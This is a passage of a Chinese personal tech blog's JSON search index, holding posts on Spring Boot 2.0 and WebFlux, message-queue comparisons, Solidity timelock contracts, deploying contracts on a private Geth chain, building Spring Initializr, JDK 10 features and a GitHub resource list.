x:int(x.split('0000')[-1],16))print(list)","categories":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"springboot2.0","slug":"SpringBoot/SpringBoot2.0","date":"2018-03-27T13:52:36.000Z","updated":"2018-03-27T13:52:36.000Z","comments":true,"path":"SpringBoot/SpringBoot2.0/","link":"","permalink":"http://yoursite.com/SpringBoot/SpringBoot2.0/","excerpt":"","text":"在是否升级的考虑上，虽然不着急升级，但是要考虑以后发展的方向，比如2.0不支持的，我们在1.x中也要少用，方便以后升级。 Spring Boot 2.0 支持Java 9 ，最低 Java 8版本。 Spring Boot 1.x版本明确说明了没有对Java 9的支持计划。 要求Gradle最低版本为3.4。 要求Tomcat最低版本为8.5。 要求Jetty最低版本为9.4。 spring-boot-starter-mustache和spring-boot-starter-thymeleaf不再依赖spring-boot-starter-web，现在你要自己选择并添加spring-boot-starter-web或spring-boot-starter-webflux作为依赖。 更详细的访问以下文章 Spring Boot 2.0 正式发布，升还是不升呢？ Spring Boot 2.0 新特性和发展方向 Spring Boot 2.0 与 Java 9","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/tags/SpringBoot/"}]},{"title":"spring-boot-starter-webflux简介","slug":"SpringBoot/SpringBootWebFlux","date":"2018-03-27T13:52:36.000Z","updated":"2018-03-27T13:52:36.000Z","comments":true,"path":"SpringBoot/SpringBootWebFlux/","link":"","permalink":"http://yoursite.com/SpringBoot/SpringBootWebFlux/","excerpt":"","text":"在Spring Boot2中引入了 Reactor Netty ，不过名字叫 Webflux 。 org.springframework.boot:spring-boot-starter-webflux -&gt; io.projectreactor.netty:reactor-netty -&gt; io.netty:netty-all 要了解 WebFlux ，首先了解下什么是 Reactive Streams（响应式流） ： 要真打算用weblux，感觉需要整体学一下Reactive响应式编程，否则很多东西不懂 Reactive Streams 是 JVM 中面向流的库标准和规范： 处理可能无限数量的元素 按顺序处理 组件之间异步传递 强制性非阻塞背压（Backpressure） Reactive Streams 的组成 发布者：发布元素到订阅者 订阅者：消费元素 订阅：在发布者中，订阅被创建时，将与订阅者共享 处理器：发布者与订阅者之间处理数据 Reactive Streams 响应式编程Reactor 一般提供两种响应式 API ： Mono：实现发布者，并返回 0 或 1 个元素 Flux：实现发布者，并返回 N 个元素 一般是将 Publisher 作为输入，在框架内部转换成 Reactor 类型并处理逻辑，然后返回 Flux 或 Mono 作为输出。 WebfluxSpring Boot Webflux 就是基于 Reactor Netty 实现的。Spring Boot 2.0 包括一个新的 spring-webflux 模块。该模块包含对响应式 HTTP 和 WebSocket 客户端的支持，以及对 REST，HTML 和 WebSocket 交互等程序的支持。 一般来说， Spring MVC 用于同步处理，Spring Webflux 用于异步处理 。 Spring Boot Webflux 有两种编程模型实现，一种类似 Spring MVC 注解方式，另一种是使用其功能性端点方式。 微服务体系结构，WebFlux 和 MVC 可以混合使用。尤其开发 IO 密集型服务的时候，选择 WebFlux 去实现。 Reactor Netty是一个异步事件驱动的网络应用程序框架。它提供非阻塞和背压就绪的TCP，HTTP和UDP客户端和服务器。顾名思义，它基于Netty框架。Spring Boot会 自动将 Reactor Netty 配置为默认服务器。除此之外，我们可以明确地将Reactor Netty添加到我们的项目中，Spring Boot应该再次自动配置它。 WebFlux 默认是通过 Netty 启动，并且自动设置了默认端口为 8080。另外还提供了对 Jetty、Undertow 等容器的支持。开发者自行在添加对应的容器 Starter 组件依赖，即可配置并使用对应内嵌容器实例。 spring-boot-starter 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;&lt;/dependency&gt;","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[{"name":"SpringBoot,webflux,spring-boot-starter-webflux","slug":"SpringBoot-webflux-spring-boot-starter-webflux","permalink":"http://yoursite.com/tags/SpringBoot-webflux-spring-boot-starter-webflux/"}]},{"title":"MQ产品对比","slug":"Web后端/MQ产品对比","date":"2018-03-27T13:52:36.000Z","updated":"2018-03-27T13:52:36.000Z","comments":true,"path":"Web后端/MQ产品对比/","link":"","permalink":"http://yoursite.com/Web后端/MQ产品对比/","excerpt":"","text":"参考资料： MQ产品比较-ActiveMQ-RocketMQ MQ选型对比文档 专访RocketMQ联合创始人：项目思路、技术细节和未来规划 ActiveMQJava开发的，Apache的项目，是JMS规范的参考实现，也是Apache旗下的老牌消息服务引擎，在该Apache顶级项目下拥有不少子项目，包括由HornetMQ演变而来的Artemis，基于Scala号称下一代AMQ的Apollo等。 官网介绍：Apollo 是一个更快、更可靠、更容易维护的消息代理，它是由最初的ActiveMQ的基础构建的。它使用一个完全不同的线程和消息调度架构来实现这一点。与ActiveMQ一样，Apollo 是一个多协议代理，支持 STOMP、AMQP、MQTT、Openwire、SSL 和 WebSockets 。 优点： 客户端语言: Java,C,C++,C#,Ruby,Perl,Python,PHP 支持协议： JMS,OpenWire,STOMP,XMPP,AMQP 支持 MQTT (个人比较关注这点) 支持SpringBoot-Starter( spring-boot-starter-activemq ) 支持集群，负载均衡，事务，持久化 对Spring的支持，可以很容易内嵌到使用Spring的系统里面去 支持通过JDBC和journal提供高速的消息持久化 支持独立部署和嵌入部署 缺点： 团队重心放到Apollo上去了，目前社区不活跃，且对 5.x 维护较少。 不适合用于上千个队列的应用场景，并发高容易丢消息。 评价： ActiveMQ 作为老牌MQ，支持很多协议，很全面，但以 JMS 为主，在很多公司得到了应用，但是更新力度不够。 RabbitMQErlang开发的，是AMQP规范的参考实现，AMQP是一个线路层协议，面面俱到，很系统，也稍显复杂。目前已经成为OpenStack Iaas平台首选的消息服务，其背后的支持力度不言而喻。 优点： 客户端语言: 支持力度大，覆盖大部分语言。 支持协议：AMQP , STOMP 支持 MQTT (RabbitMQ supports MQTT as of 3.0) ，它是以插件的形式支持了MQTT 。 支持Spring Boot-Starter (spring-boot-starter-amqp) Spring Cloud Bus 默认使用它作为中间层。 支持集群，负载均衡，持久化 团队和社区支持力度大 高并发性能好，在互联网公司有较大规模的应用。 缺点： 集群不支持动态扩展 不支持嵌入式部署 评价： 很有活力的项目，以 AMQP 协议为主，不断开始兼容其他协议，如MQTT 。 KafkaJava开发的，也是Apache的项目，最初被设计用来做日志处理，是一个不折不扣的大数据通道，追求高吞吐，存在丢消息的可能。 优点： Spring Cloud Bus 中间层的第二选择。 并发高，吞吐量大 缺点： 很多东西不支持 评价： 比较适合用于日志。 RocketMQJava开发的，阿里开发，后来捐给了Apache。天生为金融互联网领域而生，追求高可靠、高可用、高并发、低延迟。 优点： 高可靠、高可用、高并发、低延迟，支持上万个队列。 理论上不会丢失消息 缺点： 阿里自己实现的一套协议。 还没有支持 Spring Boot-Starter 评价： 如果单纯使用MQ，并且很注重消息的丢失，没有其他协议的兼容问题，可以支持一下国产软件。 MosquittoC语言开发的轻量级开源MQTT Broker，实现了MQTT协议版本3.1和3.1.1。可以说是MQTT协议坚定的执行者，现在已经是eclipse的项目。 Mosquitto不太属于此文讨论的MQ产品，但有些MQ产品也支持MQTT ，我觉得Mosquitto应该数最好的MQTT Broker了，也比较一下吧。 优点： 专注于做MQTT协议 轻量级 缺点： 客户端只有C库 无管理界面（轻量级嘛） 评价： 单纯做MQTT Broker的话，这是首选。RabbitMQ 和 ActiveMQ都是已插件的方式支持MQTT协议。另外Mosquitto这个项目提供的C库libmosquitto很适合嵌入式设备。 我的选型 开发语言 Java 框架 Spring Boot ，Spring Cloud 要用到 订阅/发布模式 （所有MQ产品都支持） 和 MQTT 将来可能会使用到 Spring Cloud Bus 并发要求不是特别高 结果：RabbitMQ 优先，ActiveMQ随后。","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[{"name":"MQ","slug":"MQ","permalink":"http://yoursite.com/tags/MQ/"}]},{"title":"2.2、solidity编写锁仓合约","slug":"区块链/2.2、solidity编写锁仓合约","date":"2018-03-26T03:55:36.000Z","updated":"2018-03-26T03:55:36.000Z","comments":true,"path":"区块链/2.2、solidity编写锁仓合约/","link":"","permalink":"http://yoursite.com/区块链/2.2、solidity编写锁仓合约/","excerpt":"","text":"所谓“锁仓合约”是指，用合约作为第三方托管资金，进行两方交易，并且有时间限制。 举个简单的例子：一位老板雇佣一位工人工作10天，老板怕工人中途跑路，工人怕老板是奸商发不发工资，那么第三方托管是不错的选择，但是我们可以通过锁仓合约来实现，更加公正。 实现：老板创建一个锁仓合约，把钱转到合约上，10天后工人可以申请释放金额，但是没有到10天（如第9天）工人都无法把钱取出。 这个就是“时间锁”。 OpenZeppelin 项目已经实现了时间锁，我们可以基于它来修改适合我们的需求，来看看源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354pragma solidity ^0.4.24;import &quot;./SafeERC20.sol&quot;;/** * @title TokenTimelock * @dev TokenTimelock is a token holder contract that will allow a * beneficiary to extract the tokens after a given release time */contract TokenTimelock &#123; using SafeERC20 for ERC20Basic; // ERC20 basic token contract being held ERC20Basic public token; // beneficiary of tokens after they are released address public beneficiary; // timestamp when token release is enabled uint256 public releaseTime; // 构造函数，在合约创建时运行 // _token 是指代币的地址，代表代币的种类 // _beneficiary 是收款的账号地址 // _releaseTime 是一个Unix时间戳（秒），表示过了这个时间就可以释放代币 constructor( ERC20Basic _token, address _beneficiary, uint256 _releaseTime ) public &#123; // solium-disable-next-line security/no-block-members require(_releaseTime &gt; block.timestamp); token = _token; beneficiary = _beneficiary; releaseTime = _releaseTime; &#125; /** * 这个是释放代币的函数，需要人为调用，如果调用成功，代币将转到beneficiary * @notice Transfers tokens held by timelock to beneficiary. */ function release() public &#123; // solium-disable-next-line security/no-block-members require(block.timestamp &gt;= releaseTime); uint256 amount = token.balanceOf(address(this)); require(amount &gt; 0); token.safeTransfer(beneficiary, amount); &#125;&#125; 本文只是讲一个简单的时间锁，另外还有断崖式持续锁仓（OpenZeppelin已实现）等可以自由实现。","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"2.1、solidity编写合约学习","slug":"区块链/2.1、solidity编写合约学习","date":"2018-03-26T03:53:36.000Z","updated":"2018-03-26T03:53:36.000Z","comments":true,"path":"区块链/2.1、solidity编写合约学习/","link":"","permalink":"http://yoursite.com/区块链/2.1、solidity编写合约学习/","excerpt":"","text":"文档英文文档v0.5.10中文文档develop IDE Remix IDE Github – 推荐，速度快。 Remix IDE Org基于浏览器的 IDE，集成了编译器和 Solidity 运行时环境，不需要服务端组件。 IntelliJ IDEA pluginIntelliJ IDEA 的 Solidity 插件（可用于其他所有的 JetBrains IDE） SublimeText — Solidity language syntaxSublimeText 编辑器的语法高亮包。 ###","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"1.2、基于Geth部署合约","slug":"区块链/1.2、基于Geth部署合约","date":"2018-03-26T03:52:36.000Z","updated":"2018-03-26T03:52:36.000Z","comments":true,"path":"区块链/1.2、基于Geth部署合约/","link":"","permalink":"http://yoursite.com/区块链/1.2、基于Geth部署合约/","excerpt":"","text":"智能合约，我理解它就是程序机器码，可以在区块链上执行的代码，好比 C语言的*.o 文件，Java的 *.class 文件。 启动 私有链，我们的程序（合约）就跑在这条私有链上。 1$ geth --datadir data0 --networkid 1108 --nodiscover console 查看挖矿账户 12&gt; web3.eth.coinbase \"0x5400ca57071e4d804e1d5f7c14f63a70fa90d541\" 编写solidity代码 123456789pragma solidity ^0.4.0;contract HelloWorld &#123; function test(uint a) constant returns(uint d)&#123; return a * 8; &#125; &#125; 编译为字节码和abi 在线编译 ，compile - Start To compile -&gt; Details bytecode 只要 object 的值，abi 全部拷贝。 注：Details -&gt; web3Deploy有部署的示例，但我们自己手动来一遍。 123456789101112131415161718192021222324252627# bytecode6060604052341561000f57600080fd5b60b98061001d6000396000f300606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806329e99f07146044575b600080fd5b3415604e57600080fd5b606a600480360381019080803590602001909291905050506080565b6040518082815260200191505060405180910390f35b60006008820290509190505600a165627a7a7230582079ee88ca1fe7e781407b09bc2c5497dcabc538d6930265a54386d2b71b0cd7510029# abi[ &#123; \"constant\": true, \"inputs\": [ &#123; \"name\": \"a\", \"type\": \"uint256\" &#125; ], \"name\": \"test\", \"outputs\": [ &#123; \"name\": \"d\", \"type\": \"uint256\" &#125; ], \"payable\": false, \"stateMutability\": \"view\", \"type\": \"function\" &#125;]# abi转义[&#123;\\\"constant\\\":true,\\\"inputs\\\":[&#123;\\\"name\\\":\\\"a\\\",\\\"type\\\":\\\"uint256\\\"&#125;],\\\"name\\\":\\\"test\\\",\\\"outputs\\\":[&#123;\\\"name\\\":\\\"d\\\",\\\"type\\\":\\\"uint256\\\"&#125;],\\\"payable\\\":false,\\\"stateMutability\\\":\\\"view\\\",\\\"type\\\":\\\"function\\\"&#125;] 创建合约对象 12345678910# 赋值为本地变量。# 因为是十六进制，加上 0x 赋值给 bytecode&gt;&gt; bytecode = '0x6060604052341561000f57600080fd5b60b98061001d6000396000f300606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806329e99f07146044575b600080fd5b3415604e57600080fd5b606a600480360381019080803590602001909291905050506080565b6040518082815260200191505060405180910390f35b60006008820290509190505600a165627a7a7230582079ee88ca1fe7e781407b09bc2c5497dcabc538d6930265a54386d2b71b0cd7510029'&gt;# abi要解析为对象。&gt; var abi = JSON.parse('[&#123;\\\"constant\\\":true,\\\"inputs\\\":[&#123;\\\"name\\\":\\\"a\\\",\\\"type\\\":\\\"uint256\\\"&#125;],\\\"name\\\":\\\"test\\\",\\\"outputs\\\":[&#123;\\\"name\\\":\\\"d\\\",\\\"type\\\":\\\"uint256\\\"&#125;],\\\"payable\\\":false,\\\"stateMutability\\\":\\\"view\\\",\\\"type\\\":\\\"function\\\"&#125;]')&gt;&gt; var helloWorldContract = web3.eth.contract(abi)undefined 预估部署合约的手续费 123456&gt; eth.estimateGas(&#123;data: bytecode&#125;)102074# 查看余额，如果账户的余额不够，先挖矿。&gt; account1 = web3.eth.coinbase&gt; web3.eth.getBalance(account1)600000000000000000000 部署 12345678910111213141516171819202122# 解锁&gt; personal.unlockAccount(account1, '123456') true# 部署，gas 是手续费&gt; var helloWorldContractInstance = helloWorldContract.new(&#123;data: bytecode ,gas: 2000000, from: account1&#125;)# 或者带上一个回调函数function，用于打印日志&gt; var helloWorldContractInstance = helloWorldContract.new( &#123; data: bytecode, gas: 2000000, from: account1 &#125;, function (e, contract)&#123; console.log(e, contract); if (typeof contract.address !== 'undefined') &#123; console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash); &#125;&#125;)# 从log看到，合约已经创建INFO [03-30|20:50:12] Submitted contract creation fullhash=0x583c5c0e6f8c2225cd8411b1ba0a58304505aea929d6c9cd1c0773c952657416 contract=0x05E4898E94785523c6C5AcBa4324B529B5197Bcfnull [object Object]undefined 合约等待挖矿，开始挖矿 合约需要有节点在挖矿才能部署成功，所以我们先启动挖矿。 1234567891011121314151617181920&gt; miner.start()INFO [03-30|20:51:30] Updated mining threads threads=0INFO [03-30|20:51:30] Transaction pool price threshold updated price=18000000000null# 这里等待一会&gt; INFO [03-30|20:51:30] Starting mining operation INFO [03-30|20:51:30] Commit new mining work number=195 txs=1 uncles=0 elapsed=998.832µsINFO [03-30|20:51:46] Successfully sealed new block number=195 hash=d60b89…65bffeINFO [03-30|20:51:46] 🔗 block reached canonical chain number=190 hash=4159ba…196761INFO [03-30|20:51:46] 🔨 mined potential block number=195 hash=d60b89…65bffeINFO [03-30|20:51:46] Commit new mining work number=196 txs=0 uncles=0 elapsed=7.087msnull [object Object]Contract mined! address: 0x05e4898e94785523c6c5acba4324b529b5197bcf transactionHash: 0x583c5c0e6f8c2225cd8411b1ba0a58304505aea929d6c9cd1c0773c952657416INFO [03-30|20:51:55] Successfully sealed new block number=196 hash=f6a947…15b0a4INFO [03-30|20:51:55] 🔗 block reached canonical chain number=191 hash=c95b93…bdd2a6INFO [03-30|20:51:55] 🔨 mined potential block number=196 hash=f6a947…15b0a4INFO [03-30|20:51:55] Commit new mining work number=197 txs=0 uncles=0 elapsed=2.289ms# 只要挖矿成功了，就可以停止了&gt; miner.stop()true 检查部署结果和调用合约方法 123456789&gt; helloWorldContractInstance.address\"0x05e4898e94785523c6c5acba4324b529b5197bcf\"&gt; &gt; eth.getCode(helloWorldContractInstance.address)\"0x606060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806329e99f07146044575b600080fd5b3415604e57600080fd5b606a600480360381019080803590602001909291905050506080565b6040518082815260200191505060405180910390f35b60006008820290509190505600a165627a7a7230582079ee88ca1fe7e781407b09bc2c5497dcabc538d6930265a54386d2b71b0cd7510029\"&gt; &gt; &gt; helloWorldContractInstance.test(4)32 OK","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"1.1、基于Geth搭建私链","slug":"区块链/1.1、基于Geth搭建私链","date":"2018-03-24T14:52:36.000Z","updated":"2018-03-24T14:52:36.000Z","comments":true,"path":"区块链/1.1、基于Geth搭建私链/","link":"","permalink":"http://yoursite.com/区块链/1.1、基于Geth搭建私链/","excerpt":"","text":"为什么要搭建私有链？ 在以太坊的公有链上部署智能合约、发起交易需要花费以太币，要同步公有链数据块（xGB）。而在私有链，上面这些都不用，我们进行智能合约开发测试就很方便了，开发完成了，再部署到公有链。 环境vmware内的ubuntu14.04，字符终端，通过ssh连接。 安装Geth1234sudo apt-get install software-properties-commonsudo add-apt-repository -y ppa:ethereum/ethereumsudo apt-get updatesudo apt-get install ethereum 1234567891011kevinwen@vm:~$ geth versionGethVersion: 1.8.2-stableGit Commit: b8b9f7f4476a30a0aaf6077daade6ae77f969960Architecture: 386Protocol Versions: [63 62]Network Id: 1Go Version: go1.9.4Operating System: linuxGOPATH=GOROOT=/usr/lib/go-1.9 准备创世区块配置文件1234567891011121314151617181920kevinwen@vm:~$ mkdir private-gethkevinwen@vm:~$ cd private-geth/kevinwen@vm:~/private-geth$ vim genesis.json&#123; \"config\": &#123; \"chainId\": 15, \"homesteadBlock\": 0, \"eip155Block\": 0, \"eip158Block\": 0 &#125;, \"coinbase\" : \"0x0000000000000000000000000000000000000000\", \"difficulty\" : \"0x20000\", \"extraData\" : \"\", \"gasLimit\" : \"0x2fefd8\", \"nonce\" : \"0x0000000000000042\", \"mixhash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\", \"parentHash\" : \"0x0000000000000000000000000000000000000000000000000000000000000000\", \"timestamp\" : \"0x00\", \"alloc\": &#123; &#125;&#125; 初始化创世区块1kevinwen@vm:~/private-geth$ geth --datadir data0 init genesis.json data0 就是当前目录下用此目录存放区块链数据 geth中保存的是区块链的相关数据，keystore中保存的是该链条中的用户信息 启动自己的私有链条12345kevinwen@vm:~/private-geth$ geth --datadir data0 --networkid 1108 --nodiscover console 2&gt;&gt;geth.log&gt; eth.accounts[]&gt; personal.newAccount(\"kevin\")\"0xf3ddc02af85fe4272398c53f60561ce01d01d757\" --nodiscover 是不要让公网上的节点发现本私有链。 2&gt;&gt;geth.log 是把日志写入到文件，不打印到终端。 personal.newAccount(“kevin”) 创建一个帐号，密码为 “kevin” 日志 开始挖矿miner.start() 开始挖矿，可以用start(2) 来启动2个线程挖矿。 miner.stop() 停止挖矿 查看帐号的余额，还是0，查看一下log文件，如下： 这是第一次启动挖矿会先生成挖矿所需的DAG文件，这个过程有点慢，等进度达到100%后，就会开始挖矿。 执行一段时间，还没开始挖矿，就出现错误了，内存不够？？？ 12runtime: out of memory: cannot allocate 2164260864-byte block (675676160 in use)意思就是无法生成2GB大小的DAG文件，系统的600MB内存已经被使用了。 这是测试机的配置(原本500M内存，调高了还是不行)太低了，看来要换台机啊！ 换机器 环境： vmware内的ubuntu16.04，GNOME图形界面。 这次在 创世纪块 的 alloc 初始化两个账户，里面初始化一些以太币。账户可以先进入console创建，再写到 genesis.json 文件，然后才初始化创世纪块。 12345678# 我没有先创建，以下账号地址不是真实的。sam@ubuntu:~/private-geth$ geth console&gt; persional.newAccont(\"123456\")\"7df9a875a174b3bc565e6424a0050ebc1b2d1d82\"&gt; persional.newAccont(\"123456\")\"f41c74c9ae680c1aa78f42e5647a62f353b7bdde\"&gt; eth.accounts[\"7df9a875a174b3bc565e6424a0050ebc1b2d1d82\",\"f41c74c9ae680c1aa78f42e5647a62f353b7bdde\"] 编写 genesis.json 文件 123456789101112131415161718192021222324&#123; \"config\": &#123; \"chainId\": 15, \"homesteadBlock\": 0, \"eip155Block\": 0, \"eip158Block\": 0 &#125;, \"coinbase\": \"0x0000000000000000000000000000000000000000\", \"difficulty\": \"0x20000\", \"extraData\": \"\", \"gasLimit\": \"0x2fefd8\", \"nonce\": \"0x0000000000000042\", \"mixhash\": \"0x0000000000000000000000000000000000000000000000000000000000000000\", \"parentHash\": \"0x0000000000000000000000000000000000000000000000000000000000000000\", \"timestamp\": \"0x00\", \"alloc\": &#123; \"7df9a875a174b3bc565e6424a0050ebc1b2d1d82\": &#123; \"balance\": \"300000\" &#125;, \"f41c74c9ae680c1aa78f42e5647a62f353b7bdde\": &#123; \"balance\": \"400000\" &#125; &#125;&#125; 设置账户7df9a875a174b3bc565e6424a0050ebc1b2d1d82为默认的挖矿账户。不设置时，默认为第一个账户，即account[0] 开始挖矿了… 停止挖矿 换一个账户挖矿 OK，先到这。 参考1 参考2","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"搭建SpringBoot initializer构建服务器","slug":"SpringBoot/搭建SpringBoot initializer构建服务器","date":"2018-03-22T03:52:36.000Z","updated":"2021-12-28T03:24:10.196Z","comments":true,"path":"SpringBoot/搭建SpringBoot initializer构建服务器/","link":"","permalink":"http://yoursite.com/SpringBoot/搭建SpringBoot initializer构建服务器/","excerpt":"","text":"下载工程 1$ git clone https://github.com/spring-io/initializr.git 构建打包 123456$ cd initializr/$ mvn compile$ mvn package -Dmaven.test.skip=true# 或者直接一条命令安装到本地maven库$ mvn clean install -Pfull 运行 1234# package打包，在initializr-service/target/下可以找到jar包# install的在 ~/.m2/repository/io/spring/initializr/initializr-service/x.x.x.BUILD-SNAPSHOT$ java -jar init.jar --server.port=8089 OK","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[]},{"title":"JDK 10 新特性","slug":"Java/JDK 10 新特性","date":"2018-03-20T11:51:38.000Z","updated":"2021-12-30T08:57:29.768Z","comments":true,"path":"Java/JDK 10 新特性/","link":"","permalink":"http://yoursite.com/Java/JDK 10 新特性/","excerpt":"","text":"2018年3月20日 JDK 10 发布，非LTS 版本。 新特性 286: Local-Variable Type Inference 296: Consolidate the JDK Forest into a Single Repository 304: Garbage-Collector Interface 307: Parallel Full GC for G1 310: Application Class-Data Sharing 312: Thread-Local Handshakes 313: Remove the Native-Header Generation Tool (javah) 314: Additional Unicode Language-Tag Extensions 316: Heap Allocation on Alternative Memory Devices 317: Experimental Java-Based JIT Compiler 319: Root Certificates 322: Time-Based Release Versioning 中文 286: 局部变量类型推断 (var x = “hello”) 296: Consolidate the JDK Forest into a Single Repository 304: Garbage-Collector Interface 307: G1并行全垃圾回收器 Parallel Full GC for G1 310: 应用类数据共享(CDS) 312: 线程-局部变量管控 313: 删除 Native-Header 自动生成工具 (javah) 314: 额外的 Unicode 语言标签扩展 316: 在备用存储装置上的堆分配 317: 试验性的基于 Java 的 JIT 编译器 319: 根证书Root Certificates 322: 基于时间的版本控制 Java 10 正式发布于 2018 年 3 月 21 日，Java 10 版本带来了很多新特性，其中最备受广大开发者关注的莫过于局部变量类型推断。除此之外，还有其他包括垃圾收集器改善、GC 改进、性能提升、线程管控等一批新特性。 局部变量类型推断局部变量类型推断是 Java 10 中最值得开发人员注意的新特性，这是 Java 语言开发人员为了简化 Java 应用程序的编写而进行的又一重要改进。 这一新功能将为 Java 增加一些新语法，允许开发人员省略通常不必要的局部变量类型初始化声明。新的语法将减少 Java 代码的冗长度，同时保持对静态类型安全性的承诺。局部变量类型推断主要是向 Java 语法中引入在其他语言（比如 C#、JavaScript）中很常见的保留类型名称 var。但需要特别注意的是：var 不是一个关键字，而是一个保留字。只要编译器可以推断此种类型，开发人员不再需要专门声明一个局部变量的类型，也就是可以随意定义变量而不必指定变量的类型。这种改进对于链式表达式来说，也会很方便。以下是一个简单的例子：清单 1. 局部变量类型推断示例12var list = new ArrayList&lt;String&gt;(); // ArrayList&lt;String&gt;var stream = list.stream(); // Stream&lt;String&gt; 看着是不是有点 JS 的感觉？有没有感觉越来越像 JS 了？虽然变量类型的推断在 Java 中不是一个崭新的概念，但在局部变量中确是很大的一个改进。说到变量类型推断，从 Java 5 中引进泛型，到 Java 7 的 &lt;&gt; 操作符允许不绑定类型而初始化 List，再到 Java 8 中的 Lambda 表达式，再到现在 Java 10 中引入的局部变量类型推断，Java 类型推断正大刀阔斧地向前进步、发展。 而上面这段例子，在以前版本的 Java 语法中初始化列表的写法为：清单 2. Java 类型初始化示例 12List&lt;String&gt; list = new ArrayList&lt;String&gt;();Stream&lt;String&gt; stream = getStream(); 在运算符允许在没有绑定 ArrayList &lt;&gt; 的类型的情况下初始化列表的写法为：清单 3. Java 7 之后版本类型初始化示例 12List&lt;String&gt; list = new LinkedList&lt;&gt;();Stream&lt;String&gt; stream = getStream(); 但这种 var 变量类型推断的使用也有局限性，仅局限于具有初始化器的局部变量、增强型 for 循环中的索引变量以及在传统 for 循环中声明的局部变量，而不能用于推断方法的参数类型，不能用于构造函数参数类型推断，不能用于推断方法返回类型，也不能用于字段类型推断，同时还不能用于捕获表达式（或任何其他类型的变量声明）。 不过对于开发者而言，变量类型显式声明会提供更加全面的程序语言信息，对于理解和维护代码有很大的帮助。Java 10 中新引入的局部变量类型推断能够帮助我们快速编写更加简洁的代码，但是局部变量类型推断的保留字 var 的使用势必会引起变量类型可视化缺失，并不是任何时候使用 var 都能容易、清晰的分辨出变量的类型。一旦 var 被广泛运用，开发者在没有 IDE 的支持下阅读代码，势必会对理解程序的执行流程带来一定的困难。所以还是建议尽量显式定义变量类型，在保持代码简洁的同时，也需要兼顾程序的易读性、可维护性。 根证书认证自 Java 9 起在 keytool 中加入参数 -cacerts，可以查看当前 JDK 管理的根证书。而 Java 9 中 cacerts 目录为空，这样就会给开发者带来很多不便。从 Java 10 开始，将会在 JDK 中提供一套默认的 CA 根证书。 作为 JDK 一部分的 cacerts 密钥库旨在包含一组能够用于在各种安全协议的证书链中建立信任的根证书。但是，JDK 源代码中的 cacerts 密钥库至目前为止一直是空的。因此，在 JDK 构建中，默认情况下，关键安全组件（如 TLS）是不起作用的。要解决此问题，用户必须使用一组根证书配置和 cacerts 密钥库下的 CA 根证书。 其他特性其他的看不懂，不写出来了。 更多信息请看 Java 10 新特性介绍","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"GitHub资源备忘2018","slug":"github/GitHub资源备忘2018","date":"2018-03-16T01:52:36.000Z","updated":"2018-03-16T01:52:36.000Z","comments":true,"path":"github/GitHub资源备忘2018/","link":"","permalink":"http://yoursite.com/github/GitHub资源备忘2018/","excerpt":"","text":"https://github.com/trending/java 头像生成Github预览地址 VerticalSlideView类似淘宝的商品详情页，继续拖动查看详情，其中拖动增加了阻尼，并且重写了ListView，GridView，ScrollView，WebView，RecyclerView 的 dispatchTouchEvent 方法，使用的时候无须额外的代码，可以任意嵌套使用。Github Java 的 Markdown 解析器 commonmark-javacommonmark-java 是一个 Markdown 解析器，一个基于 CommonMark 规范解析和渲染 Markdown 文本的 Java 库Github具有以下特性： 小（最小化的依赖） 快 （比 pegdown 快 10-20 倍，在仓库中可查看 benchmarks） 灵活 （解析后可操作 AST，自定义 HTML 渲染） 可扩展（表格，删除线，自动链接等等） 利用图表实现价格范围添加的Android库Github 标签组件Kongzue StackLabel 是堆叠标签组件，适合快速完成需要堆叠标签的场景，例如“搜索历史”、“猜你喜欢”等功能。Github 一个Android颜色选择器库Github HoloColorPickerGithub ColorPickerViewGithub ColorPickerGithub 圆形SeekBarGithub 垂直SeekBarGithub IndicatorSeekBarGithub MusicAnimLineGithub MediumClap-AndroidGithub WaveViewGithub ShadowImageView可以根据图片内容变阴影颜色，更加细腻的阴影效果Github SVGAPlayer 播放 After Effects / Animate CC (Flash) 动画Github Iconfont-阿里巴巴矢量图标库官网需要登录(可以用微博)，可以下载SVG和PNG格式。 开源Icon MaterialDesign支持Android(Vector/SVG,官网选中图标右键可以直接看Vector)，Web(css字体)，Windows(字体)，官网Github InfiniteCycleViewPagerGithub QMUI_Android文档Github package com.qmuiteam.qmui.util 里面有很多实用的工具类，如状态栏相关的工具类：QMUIStatusBarHelper VorolayGithub FlabbyListViewGithub Ferris-Wheel动画Github 在空间中绘制随机飞行粒子形成星座Github md编辑器Github md编译和解析Github ##将文本转换为UML序列图Github AnimatedTabLayoutGithub Fragmentation为”单Activity ＋ 多Fragment”,”多模块Activity + 